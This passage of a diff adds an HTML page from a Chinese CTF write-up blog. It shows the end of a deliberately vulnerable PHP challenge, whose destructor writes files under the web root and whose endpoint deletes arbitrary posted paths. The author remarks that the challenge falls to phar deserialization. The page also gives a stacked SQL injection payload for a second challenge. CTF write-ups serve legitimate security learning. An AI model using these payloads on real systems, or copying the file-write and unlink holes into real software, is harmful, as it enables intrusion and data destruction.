+            <span class="k">die</span><span class="p">(</span><span class="s2">&#34;Hacker...&#34;</span><span class="p">);</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">test</span><span class="p">();</span>
+    <span class="p">}</span>
+    <span class="k">public</span> <span class="k">function</span> <span class="nf">test</span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="nv">$filename</span> <span class="o">=</span> <span class="s2">&#34;/var/www/html/&#34;</span> <span class="o">.</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file_name</span><span class="p">;</span>
+        <span class="nx">file_put_contents</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">content</span><span class="p">);</span>
+        <span class="k">echo</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file_name</span> <span class="o">.</span> <span class="s2">&#34; create Successful!!!&#34;</span><span class="p">;</span>
+    <span class="p">}</span>
+
+<span class="p">}</span>
+<span class="k">if</span> <span class="p">(</span><span class="nv">$method</span> <span class="o">==</span> <span class="s2">&#34;unlink&#34;</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">]))</span> <span class="p">{</span>
+            <span class="k">echo</span> <span class="s1">&#39;unlink html form&#39;</span><span class="p">;</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+            <span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">];</span>
+            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">unlink</span><span class="p">(</span><span class="nv">$file</span><span class="p">))</span> <span class="p">{</span>
+                <span class="k">echo</span> <span class="s2">&#34;删除失败&#34;</span><span class="p">;</span>
+            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+                <span class="k">echo</span> <span class="s2">&#34;删除成功&#34;</span><span class="p">;</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+
+    <span class="p">}</span>
+<span class="cp">?&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>很明显phar反序列化，构造一下生成phar文件改后缀上传即可</p>
+<h2 id="stack3d-1nj3c">StAck3d 1nj3c</h2>
+<p>与<code>[SUCTF 2019]EasySQL</code>类似</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-mysql" data-lang="mysql"><span class="mi">1</span><span class="p">;</span><span class="kt">set</span> <span class="n">sql_mode</span><span class="o">=</span><span class="n">PIPES_AS_CONCAT</span><span class="p">;</span><span class="k">select</span> <span class="mi">1</span>
+</code></pre></td></tr></table>
+</div>
+</div></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2021-02-27</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://clq0.top/%E5%9B%9B%E5%8F%B6%E8%8D%89%E5%AE%89%E5%85%A8%E7%89%9B%E5%B9%B4ctf%E5%A4%A7%E8%B5%9B/" data-title="四叶草安全牛年CTF大赛" data-hashtags="SSRF,SQL注入,unserialize"><i class="fab fa-twitter fa-fw"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://clq0.top/%E5%9B%9B%E5%8F%B6%E8%8D%89%E5%AE%89%E5%85%A8%E7%89%9B%E5%B9%B4ctf%E5%A4%A7%E8%B5%9B/" data-hashtag="SSRF"><i class="fab fa-facebook-square fa-fw"></i></a><a href="javascript:void(0);" title="Share on Reddit" data-sharer="reddit" data-url="https://clq0.top/%E5%9B%9B%E5%8F%B6%E8%8D%89%E5%AE%89%E5%85%A8%E7%89%9B%E5%B9%B4ctf%E5%A4%A7%E8%B5%9B/"><i class="fab fa-reddit fa-fw"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://clq0.top/%E5%9B%9B%E5%8F%B6%E8%8D%89%E5%AE%89%E5%85%A8%E7%89%9B%E5%B9%B4ctf%E5%A4%A7%E8%B5%9B/" data-title="四叶草安全牛年CTF大赛"><i class="fab fa-weibo fa-fw"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/ssrf/">SSRF</a>,&nbsp;<a href="/tags/sql%E6%B3%A8%E5%85%A5/">SQL注入</a>,&nbsp;<a href="/tags/unserialize/">unserialize</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/computer_organization_and_architecture/" class="prev" rel="prev" title="计算机组成与结构笔记"><i class="fas fa-angle-left fa-fw"></i>计算机组成与结构笔记</a>
+            <a href="/ciscn2021_writeup/" class="next" rel="next" title="CISCN2021 Writeup">CISCN2021 Writeup<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+<div id="comments"><div id="valine" class="comment"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://valine.js.org/">Valine</a>.
+            </noscript></div></article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line"><a>本网站由</a><a href="https://www.upyun.com/?utm_source=lianmeng&utm_medium=referral" target="-blank"><img src="/upyun_logo2.png" width="4%" style="vertical-align:middle"></a><a>提供CDN加速/云存储服务</a></div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2020 - 2021</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="http://clq0.top" target="_blank">Leon</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span><span class="icp-splitter">&nbsp;|&nbsp;</span><br class="icp-br"/>
+                    <span class="icp"><script type="text/javascript" src="https://s9.cnzz.com/z_stat.php?id=1278765080&web_id=1278765080"></script></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/valine/valine.min.css"><link rel="stylesheet" href="/lib/lightgallery/lightgallery.min.css"><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/katex/copy-tex.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script type="text/javascript" src="/lib/valine/Valine.min.js"></script><script type="text/javascript" src="/lib/smooth-scroll/smooth-scroll.min.js"></script><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lightgallery.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-thumbnail.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-zoom.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/mhchem.min.js"></script><script type="text/javascript" src="/lib/cookieconsent/cookieconsent.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":40},"comment":{"valine":{"appId":"saBpLNPwjiIGzpSf9QvvTLw3-9Nh9j0Va","appKey":"jU0L8JdQYxxwunKTXrmGV194","avatar":"mp","el":"#valine","emojiCDN":"https://cdn.jsdelivr.net/npm/emoji-datasource-google@5.0.1/img/google/64/","emojiMaps":{"100":"1f4af.png","alien":"1f47d.png","anger":"1f4a2.png","angry":"1f620.png","anguished":"1f627.png","astonished":"1f632.png","black_heart":"1f5a4.png","blue_heart":"1f499.png","blush":"1f60a.png","bomb":"1f4a3.png","boom":"1f4a5.png","broken_heart":"1f494.png","brown_heart":"1f90e.png","clown_face":"1f921.png","cold_face":"1f976.png","cold_sweat":"1f630.png","confounded":"1f616.png","confused":"1f615.png","cry":"1f622.png","crying_cat_face":"1f63f.png","cupid":"1f498.png","dash":"1f4a8.png","disappointed":"1f61e.png","disappointed_relieved":"1f625.png","dizzy":"1f4ab.png","dizzy_face":"1f635.png","drooling_face":"1f924.png","exploding_head":"1f92f.png","expressionless":"1f611.png","face_vomiting":"1f92e.png","face_with_cowboy_hat":"1f920.png","face_with_hand_over_mouth":"1f92d.png","face_with_head_bandage":"1f915.png","face_with_monocle":"1f9d0.png","face_with_raised_eyebrow":"1f928.png","face_with_rolling_eyes":"1f644.png","face_with_symbols_on_mouth":"1f92c.png","face_with_thermometer":"1f912.png","fearful":"1f628.png","flushed":"1f633.png","frowning":"1f626.png","ghost":"1f47b.png","gift_heart":"1f49d.png","green_heart":"1f49a.png","grimacing":"1f62c.png","grin":"1f601.png","grinning":"1f600.png","hankey":"1f4a9.png","hear_no_evil":"1f649.png","heart":"2764-fe0f.png","heart_decoration":"1f49f.png","heart_eyes":"1f60d.png","heart_eyes_cat":"1f63b.png","heartbeat":"1f493.png","heartpulse":"1f497.png","heavy_heart_exclamation_mark_ornament":"2763-fe0f.png","hole":"1f573-fe0f.png","hot_face":"1f975.png","hugging_face":"1f917.png","hushed":"1f62f.png","imp":"1f47f.png","innocent":"1f607.png","japanese_goblin":"1f47a.png","japanese_ogre":"1f479.png","joy":"1f602.png","joy_cat":"1f639.png","kiss":"1f48b.png","kissing":"1f617.png","kissing_cat":"1f63d.png","kissing_closed_eyes":"1f61a.png","kissing_heart":"1f618.png","kissing_smiling_eyes":"1f619.png","laughing":"1f606.png","left_speech_bubble":"1f5e8-fe0f.png","love_letter":"1f48c.png","lying_face":"1f925.png","mask":"1f637.png","money_mouth_face":"1f911.png","nauseated_face":"1f922.png","nerd_face":"1f913.png","neutral_face":"1f610.png","no_mouth":"1f636.png","open_mouth":"1f62e.png","orange_heart":"1f9e1.png","partying_face":"1f973.png","pensive":"1f614.png","persevere":"1f623.png","pleading_face":"1f97a.png","pouting_cat":"1f63e.png","purple_heart":"1f49c.png","rage":"1f621.png","relaxed":"263a-fe0f.png","relieved":"1f60c.png","revolving_hearts":"1f49e.png","right_anger_bubble":"1f5ef-fe0f.png","robot_face":"1f916.png","rolling_on_the_floor_laughing":"1f923.png","scream":"1f631.png","scream_cat":"1f640.png","see_no_evil":"1f648.png","shushing_face":"1f92b.png","skull":"1f480.png","skull_and_crossbones":"2620-fe0f.png","sleeping":"1f634.png","sleepy":"1f62a.png","slightly_frowning_face":"1f641.png","slightly_smiling_face":"1f642.png","smile":"1f604.png","smile_cat":"1f638.png","smiley":"1f603.png","smiley_cat":"1f63a.png","smiling_face_with_3_hearts":"1f970.png","smiling_imp":"1f608.png","smirk":"1f60f.png","smirk_cat":"1f63c.png","sneezing_face":"1f927.png","sob":"1f62d.png","space_invader":"1f47e.png","sparkling_heart":"1f496.png","speak_no_evil":"1f64a.png","speech_balloon":"1f4ac.png","star-struck":"1f929.png","stuck_out_tongue":"1f61b.png","stuck_out_tongue_closed_eyes":"1f61d.png","stuck_out_tongue_winking_eye":"1f61c.png","sunglasses":"1f60e.png","sweat":"1f613.png","sweat_drops":"1f4a6.png","sweat_smile":"1f605.png","thinking_face":"1f914.png","thought_balloon":"1f4ad.png","tired_face":"1f62b.png","triumph":"1f624.png","two_hearts":"1f495.png","unamused":"1f612.png","upside_down_face":"1f643.png","weary":"1f629.png","white_frowning_face":"2639-fe0f.png","white_heart":"1f90d.png","wink":"1f609.png","woozy_face":"1f974.png","worried":"1f61f.png","yawning_face":"1f971.png","yellow_heart":"1f49b.png","yum":"1f60b.png","zany_face":"1f92a.png","zipper_mouth_face":"1f910.png","zzz":"1f4a4.png"},"enableQQ":false,"highlight":true,"lang":"en","pageSize":10,"placeholder":"Your comment ...","recordIP":true,"visitor":true}},"cookieconsent":{"content":{"dismiss":"Got it!","link":"Learn more","message":"This website uses Cookies to improve your experience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"lightGallery":{"actualSize":false,"exThumbImage":"data-thumbnail","hideBarsDelay":2000,"selector":".lightgallery","speed":400,"thumbContHeight":80,"thumbWidth":80,"thumbnail":true},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":50,"type":"lunr"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
